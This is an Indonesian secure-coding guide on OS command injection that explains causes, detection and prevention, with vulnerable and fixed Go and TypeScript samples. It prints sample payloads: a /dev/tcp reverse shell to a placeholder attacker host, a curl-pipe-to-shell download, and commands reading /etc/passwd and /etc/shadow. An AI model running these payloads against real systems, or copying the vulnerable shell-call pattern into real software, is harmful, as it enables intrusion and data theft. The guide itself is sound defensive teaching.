# Command Injection (OS Command Injection)

> **Metadata Keamanan:**
> - **CWE**: [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
> - **OWASP**: [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
> - **Tingkat Keparahan (Severity)**: Critical (CVSS ~ 9.0 - 10.0)

---

## 1. Pengertian

**Command Injection** (atau *OS Command Injection*) adalah celah keamanan di mana aplikasi web mengeksekusi perintah sistem operasi (Linux/Windows Shell) dengan menyertakan input dari pengguna tanpa penyaringan, sehingga penyerang dapat menjalankan perintah sistem sewenang-wenang.

**Analogi Sederhana:**  
Bayangkan sebuah smart speaker di rumah yang bisa dipanggil: "Hai Asisten, tolong buatkan kopi".  
Lalu ada tamu nakal berteriak: "Hai Asisten, tolong buatkan kopi **DAN matikan seluruh listrik rumah serta buka kunci pintu depan!**"  
Jika asisten cerdas tersebut menjalankan seluruh kalimat itu tanpa membatasi bahwa perintah yang diizinkan *hanya* urusan kopi, maka rumah Anda telah mengalami *command injection*.

---

## 2. Cara Kerja

Banyak aplikasi memanggil utilitas sistem operasi bawaan untuk tugas tertentu, misalnya melakukan ping jaringan, mengonversi file gambar (ImageMagick), atau membuat arsip zip.

Developer yang ceroboh sering memanggil shell secara langsung:
```bash
ping -c 4 <input_ip>
```

Pada shell sistem operasi (seperti Bash atau `cmd.exe`), karakter tertentu digunakan untuk merangkai beberapa perintah sekaligus:
- `;` atau `&&` (jalankan perintah berikutnya)
- `|` (kirim output ke perintah berikutnya)
- `` `...` `` atau `$(...)` (jalankan sub-perintah)

Jika penyerang memasukkan input:
```text
8.8.8.8; cat /etc/passwd
```
Sistem akan mengeksekusi dua perintah berturut-turut: pertama melakukan `ping 8.8.8.8`, lalu membaca berkas kredensial `/etc/passwd`.

---

## 3. Penyebab

- **Memanggil Perintah Melalui Shell Interpreter**: Menggunakan fungsi seperti `exec("sh -c ...")`, `system()`, atau `child_process.exec()` yang membungkus input di dalam shell.
- **Penyusunan Perintah dengan Penggabungan String**: Menggabungkan argumen perintah menggunakan string biasa tanpa validasi karakter khusus shell.
- **Ketiadaan Whitelist Input**: Tidak membatasi format input (misalnya hanya menerima karakter angka dan titik untuk alamat IP).

---

## 4. Skenario Serangan

1. **Observasi Fitur**: Penyerang menemukan fitur "Network Diagnostic Tool" pada panel admin router atau dashboard server dengan input nama domain/IP.
2. **Uji Karakter Pemisah**: Penyerang mencoba input `127.0.0.1; whoami` atau `127.0.0.1 && id`.
3. **Konfirmasi Eksekusi**: Hasil output pada layar menampilkan respon ping disusul baris: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.
4. **Pengambilalihan Sistem (Reverse Shell)**: Penyerang mengirim payload yang membuka koneksi shell balik ke komputernya:
   `127.0.0.1; bash -i >& /dev/tcp/attacker.ip/4444 0>&1`.
   Penyerang kini memiliki kendali penuh atas terminal server tersebut.

---

## 5. Dampak

- **Remote Code Execution (RCE) Penuh**: Penyerang dapat mengunduh malware, mengubah konfigurasi sistem, dan membaca file rahasia (kunci database, source code, sertifikat SSL).
- **Lateral Movement**: Server yang telah dikuasai dapat dijadikan batu loncatan untuk menyerang server lain di dalam jaringan internal perusahaan yang terlindungi firewall.
- **Data Deletion / Ransomware**: Penyerang dapat menghapus seluruh isi server (`rm -rf /`) atau mengenkripsi file untuk meminta tebusan.

---

## 6. Bagian Sistem yang Terdampak

- Alat diagnostik server (Ping, Traceroute, DNS lookup).
- Fitur konversi format berkas (PDF generator, video/image resizing).
- Fitur backup/kompresi berkas otomatis (zip, tar).
- Integrasi CI/CD atau script otomatisasi deployment.

---

## 7. Contoh Kasus Nyata dalam Sebuah Sistem

> *Catatan: Kasus berikut adalah simulasi edukatif yang realistis untuk mempermudah pemahaman.*

**Sistem Monitoring Jaringan Kampus Universitas Digital:**  
Universitas menyediakan portal web bagi staf lab untuk mengecek ketersediaan komputer laboratorium menggunakan perintah `ping`.

Backend NodeJS memanggil shell:
```javascript
exec(`ping -c 2 ${req.body.host}`, (err, stdout) => { ... });
```

Seorang penyerang mengirim request dengan body:
```json
{ "host": "localhost; curl https://malicious.site/script.sh | sh" }
```

Server kampus mengunduh dan mengeksekusi skrip berbahaya dari internet. Skrip tersebut memasang *crypto miner* yang menguras sumber daya prosesor server kampus dan menyedot data akademik mahasiswa.

---

## 8. Cara Mendeteksi

- **SAST**: Pemindai kode akan menandai pemanggilan fungsi berbahaya seperti `exec`, `spawn('sh')`, `system`, atau `os/exec.Command("sh", "-c", ...)` yang menerima variabel dinamis.
- **Audit Manual**: Periksa setiap fungsi yang berinteraksi dengan proses anak (*child process*) sistem operasi.
- **EDR & Host Monitoring**: Deteksi proses yang aneh muncul dari proses web server (misalnya web server `www-data` tiba-tiba melahirkan proses `bash`, `curl`, atau `powershell`).

---

## 9. Pencegahan

1. **Hindari Pemanggilan Shell Jika Ada Library Bahasa Pemrograman (Utama)**:  
   Gunakan pustaka bawaan bahasa daripada memanggil perintah eksternal. Misalnya, jika ingin melakukan ping, gunakan library ICMP murni; jika ingin mengubah ukuran gambar, gunakan library grafik Go/Node.js, bukan memanggil CLI `convert`.
2. **Gunakan Parameterized Execution (Tanpa Shell Wrapper)**:  
   Jika memang harus memanggil program eksternal, panggil executable secara langsung dengan argumen terpisah sebagai array (misalnya `exec.Command("ping", "-c", "2", host)`), **JANGAN PERNAH** memanggil melalui shell (`sh -c` atau `cmd.exe /c`).
3. **Validasi Whitelist Ketat**:  
   Gunakan ekspresi reguler atau parser yang ketat (misalnya alamat IP harus valid menurut `net.ParseIP` di Go).

---

## 10. Penanganan

1. **Isolasi Server**: Segera putuskan koneksi internet server yang terdampak untuk mencegah eksfiltrasi data atau kendali reverse shell aktif.
2. **Identifikasi Proses Jahat**: Periksa daftar proses berjalan (`ps aux`, `tasklist`) dan bunuh (*kill*) proses asing.
3. **Ganti Kode dengan Library Internal**: Hilangkan ketergantungan pada pemanggilan shell sistem operasi.
4. **Cek Integritas File**: Lakukan verifikasi apakah ada *backdoor* (webshell) yang sempat diunggah ke sistem.

---

## 11. Contoh Implementasi

### A. Contoh dalam Golang

```go
package main

import (
	"fmt"
	"net"
	"os/exec"
)

// ❌ KODE RENTAN (Vulnerable)
// Menjalankan input melalui shell "sh -c", memungkinkan penggunaan simbol ";" atau "&&"
func PingHostVulnerable(host string) (string, error) {
	cmdStr := fmt.Sprintf("ping -c 2 %s", host)
	cmd := exec.Command("sh", "-c", cmdStr) // Menjalankan shell interpreter
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// ✅ KODE AMAN (Secure)
// 1. Validasi input terlebih dahulu
// 2. Eksekusi program langsung tanpa perantara shell "sh"
func PingHostSecure(host string) (string, error) {
	// Validasi bahwa host adalah IP yang sah
	ip := net.ParseIP(host)
	if ip == nil {
		return "", fmt.Errorf("alamat IP tidak valid")
	}

	// Argumen diberikan sebagai elemen array terpisah
	// Sistem operasi tidak akan memperlakukan argumen sebagai perintah baru meskipun ada simbol khusus
	cmd := exec.Command("ping", "-c", "2", ip.String())
	out, err := cmd.CombinedOutput()
	return string(out), err
}
```

### B. Contoh dalam TypeScript (Node.js)

```typescript
import { exec, execFile } from 'child_process';
import net from 'net';

// ❌ KODE RENTAN (Vulnerable)
// child_process.exec secara default menjalankan perintah di dalam shell
export function checkHostVulnerable(host: string) {
  // Jika host = "127.0.0.1 && cat /etc/shadow"
  exec(`ping -c 2 ${host}`, (error, stdout) => {
    console.log(stdout);
  });
}

// ✅ KODE AMAN (Secure)
// 1. Validasi alamat IP
// 2. Gunakan execFile yang memanggil binary langsung TANPA shell
export function checkHostSecure(host: string): Promise<string> {
  return new Promise((resolve, reject) => {
    // Validasi apakah input benar-benar format IP yang sah
    if (!net.isIP(host)) {
      return reject(new Error('Format IP tidak valid'));
    }

    // execFile tidak menggunakan shell, sehingga simbol ;, &&, | tidak akan dievaluasi
    execFile('ping', ['-c', '2', host], (error, stdout) => {
      if (error) {
        return reject(error);
      }
      resolve(stdout);
    });
  });
}
```

---

## 12. Pengujian dan Verifikasi

### Pengujian Lokal dengan Payload Command Separator
Kirimkan input dengan karakter pemisah perintah:
```bash
curl -X POST http://localhost:8080/api/diagnostics/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; echo INJECTION_BERHASIL"}'
```
- **Kondisi Rentan**: Output respons memuat teks `INJECTION_BERHASIL`.
- **Kondisi Aman**: Sistem mengembalikan error `400 Bad Request` ("Format IP tidak valid") dan perintah `echo` sama sekali tidak dieksekusi.

---

## Referensi

- [OWASP Command Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [MITRE CWE-78 Definition](https://cwe.mitre.org/data/definitions/78.html)
- [PortSwigger: OS Command Injection](https://portswigger.net/web-security/os-command-injection)
